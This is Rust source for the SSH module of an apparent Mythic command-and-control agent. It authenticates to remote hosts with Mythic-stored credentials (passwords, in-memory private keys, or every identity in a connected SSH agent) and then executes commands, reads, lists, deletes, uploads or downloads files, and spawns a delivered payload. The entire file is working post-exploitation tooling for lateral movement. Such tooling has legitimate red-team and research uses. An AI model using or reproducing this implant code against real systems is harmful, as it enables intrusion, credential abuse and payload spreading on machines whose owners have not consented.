use crate::agent::AgentTask;
use serde::Deserialize;
use ssh2::Session;
use std::error::Error;
use std::net::TcpStream;
use std::result::Result;
use std::sync::mpsc;

pub mod agent;
pub mod spawn;

mod cat;
mod download;
mod exec;
mod ls;
mod rm;
mod upload;

/// Mythic credentials for authentication
#[derive(Default, Debug, Deserialize)]
pub struct Credentials {
    /// Account to authenticate as
    pub account: String,

    /// Comment in the Mythic credentials
    pub _comment: String,

    /// Credential for authentication
    pub credential: String,

    /// Realm this credential is from
    pub _realm: String,

    /// Credential type
    #[serde(alias = "type")]
    pub cred_type: String,
}

/// Arguments for the SSH command
#[derive(Default, Debug, Deserialize)]
pub struct SshArgs {
    /// Credentials used for the SSH connection
    pub credentials: Credentials,

    /// Option for whether or not to use the connected SSH agent
    pub agent: bool,

    /// Host to connect to
    pub host: String,

    /// Port to connect to
    pub port: u32,

    /// Command to execute for `ssh -exec`
    pub exec: Option<String>,

    /// File to read for `ssh -cat`
    pub cat: Option<String>,

    /// File to remove for `ssh -rm`
    pub rm: Option<String>,

    /// File to download for `ssh -download`
    pub download: Option<String>,

    /// File to list for `ssh -ls`
    pub list: Option<String>,

    /// File to upload for `ssh -upload`
    pub upload: Option<String>,

    /// File permissions for uploaded file for `ssh -upload`
    pub mode: Option<i32>,

    /// Path to upload the file to for `ssh -upload`/`ssh-spawn`
    pub upload_path: Option<String>,
}

/// Converts the `ssh-spawn` arguments to `ssh` arguments
impl From<self::spawn::SshSpawnArgs> for SshArgs {
    fn from(spawn_args: self::spawn::SshSpawnArgs) -> Self {
        Self {
            credentials: spawn_args.credentials,
            host: spawn_args.host,
            agent: spawn_args.agent,
            port: spawn_args.port,
            exec: Some(spawn_args.exec),
            download: Some(spawn_args.payload),
            ..Default::default()
        }
    }
}

/// Authenticates to a machine using ssh
/// * `args` - Arguments for the command
pub fn ssh_authenticate(args: &SshArgs) -> Result<Session, Box<dyn Error>> {
    // Connect to the ssh server
    let conn_addr = format!("{}:{}", &args.host, &args.port);
    let tcp = TcpStream::connect(conn_addr)?;

    // Create a new ssh session from a TCP connection
    let mut sess = Session::new()?;
    sess.set_tcp_stream(tcp);
    sess.handshake()?;

    // Check if the agent should authenticate using the connected ssh agent
    if args.agent {
        let mut agent = sess.agent()?;
        agent.connect()?;
        agent.list_identities()?;

        // Try to authenticate using every identity
        for key in agent.identities()? {
            if agent.userauth(&args.credentials.account, &key).is_ok() {
                return Ok(sess);
            }
        }

        return Err("Could not authenticate with any stored ssh agent identities".into());
    } else {
        // Check if the credential type is plaintext or an ssh key
        match args.credentials.cred_type.as_str() {
            // Try to do username/password authentication
            "plaintext" => {
                sess.userauth_password(&args.credentials.account, &args.credentials.credential)?;
            }

            // Try to do username/sshkey authentication
            #[cfg(target_os = "linux")]
            "key" => {
                sess.userauth_pubkey_memory(
                    &args.credentials.account,
                    None,
                    &args.credentials.credential,
                    None,
                )?;
            }

            _ => return Err("Invalid auth type".into()),
        }
    };

    Ok(sess)
}

/// Run the ssh command and parse the option
/// * `tx` - Channel for sending information to Mythic
/// * `rx` - Channel for receiving information from Mythic
pub fn run_ssh(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Parse the initial task
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: SshArgs = serde_json::from_str(&task.parameters)?;

    // Check if the task is a file upload through ssh
    if args.upload.is_some() {
        upload::upload_file(&task.id, &args, tx, rx)?;
        return Ok(());
    }

    // Create a new SSH session and authenticate
    let sess = ssh_authenticate(&args)?;

    // Create the final user output
    let output: serde_json::Value;

    // Check if the task is for executing a shell command over ssh
    if args.exec.is_some() {
        output = exec::run_cmd(sess, &task, &args)?;
        // Check if the task is to download a file
    } else if args.download.is_some() {
        output = download::download_file(sess, &task, &args, tx, rx)?;
        // Check if the task is to list a directory
    } else if let Some(path) = args.list {
        output = ls::ssh_list(sess, &path, &task.id, args.host)?;
        // Check if the task is to cat a file
    } else if args.cat.is_some() {
        output = cat::ssh_cat(sess, &task, &args)?;
        // Check if the task is to remove a file
    } else if args.rm.is_some() {
        output = rm::ssh_remove(sess, &task, &args)?;
    } else {
        // Invalid arguments
        return Err("Failed to parse parameters".into());
    }

    // Final task output
    tx.send(output)?;
    Ok(())
}
